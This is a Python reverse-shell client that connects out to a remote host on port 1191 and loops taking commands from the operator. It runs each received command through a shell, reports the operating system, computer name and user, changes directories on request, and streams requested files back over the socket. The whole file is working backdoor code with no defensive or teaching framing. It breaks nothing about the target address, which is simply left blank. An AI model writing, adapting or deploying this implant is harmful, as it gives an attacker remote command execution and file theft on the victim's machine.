from http import client
import subprocess
import socket
import os
import platform
import getpass
from time import sleep
from flask_login import current_user

from py import process

ip_address=""
port=1191
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
print("initiating process")
client.connect((ip_address,port))
print("connection intitated")
while True:
    print("[-] wainting for commands")
    client.send("{}$".format(os.getcwd()).encode())
    command=client.recv(1024)
    command= command.decode()
    # check commands
    # change directory
    try:
        if command.split()[0]=="cd":
            try:
                os.chdir(command.split()[1])
                client.send("Changed directory to {}".format(os.getcwd()).encode())
            except Exception as e:
                client.send(f"{e}".encode())
        elif command=="sysinfo":
            operatingSystem=platform.system()
            computerName=platform.node()
            user=getpass.getuser()
            
            systemInfo=f"""
os:{operatingSystem}
compName:{computerName}
user:{user}        
            """.encode()
            client.send(systemInfo)
        elif command=="whoami":
             user=getpass.getuser()
             currentUser=f"""
user:{user}
             """.encode()
             client.send(currentUser)
             
        elif command.split(" ")[0] == "download":
            file_name=command.split(" ")[1]
            checkFile=os.path.isfile(file_name)
            if checkFile==False:
                client.send("NO".encode())
            else:
                client.send("Ok".encode())
                with open(command.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        client.send(file_data)
                        file_data = f.read(1024)
                    sleep(2)
                    client.send("DONE".encode())
        else:
            op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
            output_error=op.stderr.read()
            output=op.stdout.read()
            print("sending response")
            client.send(output+output_error)
    except Exception as e:
        client.send(f"{e}".encode())
        
    
    
    
    